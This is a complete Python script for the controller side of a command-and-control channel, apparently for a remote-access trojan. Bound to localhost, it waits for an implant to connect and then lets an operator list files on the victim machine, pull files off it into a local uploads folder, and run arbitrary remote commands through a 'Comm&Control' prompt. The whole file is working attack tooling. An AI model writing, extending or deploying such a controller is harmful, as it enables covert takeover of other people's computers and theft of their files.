import socket

index = 1000

def send_data(conn, data):
    size = str(len(data))
    conn.sendall(size.encode() + b'#')
    conn.sendall(data.encode())

def receive_data(conn):
    size = ""
    while True:
        byte = conn.recv(1)
        if byte.decode() == "#":
            break
        size += byte.decode()
    size = int(size)
    data = conn.recv(size)
    return data.decode()

def list_files(conn, param):
    tosend = "LIST#" + param
    send_data(conn, tosend)
    data = receive_data(conn)
    print(data)

def upload_file(conn, param):
    global index
    tosend = "UPLOAD#" + param
    send_data(conn, tosend)
    data = receive_data(conn)
    with open("uploads/upl" + str(index), "w") as f:
        f.write(data)
    index += 1

def cmd(conn, param):
    tosend = "CMD#" + param
    send_data(conn, tosend)
    data = receive_data(conn)
    print(data)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("127.0.0.1", 12347))
    s.listen()
    conn, addr = s.accept()

    while True:
        uinp = input("[LCS@Comm&Control]$ ")
        verbe, param = (uinp.split(" ", 1) + [""])[:2]

        if verbe == "ls":
            list_files(conn, param)
        elif verbe == "get":
            upload_file(conn, param)
        elif verbe == "cmd":
            cmd(conn, param)
        elif verbe == "exit":
            s.shutdown(2)
            s.close()
            exit()
        else:
            print("Unknown Command...")

